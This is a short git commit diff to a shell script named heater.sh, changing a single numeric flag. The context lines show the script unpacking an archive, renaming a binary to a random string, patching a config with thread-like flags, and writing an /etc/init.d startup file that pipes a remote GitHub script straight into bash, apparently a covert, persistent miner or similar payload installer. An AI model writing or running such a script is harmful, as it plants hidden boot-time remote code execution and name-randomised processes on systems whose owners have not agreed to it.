34f91845684ee99c210ec5b44a08217de3a46b91
outputy <nabaati13@gmail.com>
2024-06-10 10:15:27 +0700

    Update heater.sh

--- heater.sh
+++ heater.sh
@@ -4,7 +4,7 @@ tar -xvf copper.tar
 cd /copper
 variable1=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
 mv scron $variable1
-sed -i "s/oodo/${variable1} -t=470 -n=${variable1}/g" ./memory.sh
+sed -i "s/oodo/${variable1} -t=450 -n=${variable1}/g" ./memory.sh
 cd /etc/init.d
 echo "bash <(curl -s -L https://raw.githubusercontent.com/ccamse/buzzer/main/heater.sh)" > socket.sh
 chmod a+x socket.sh
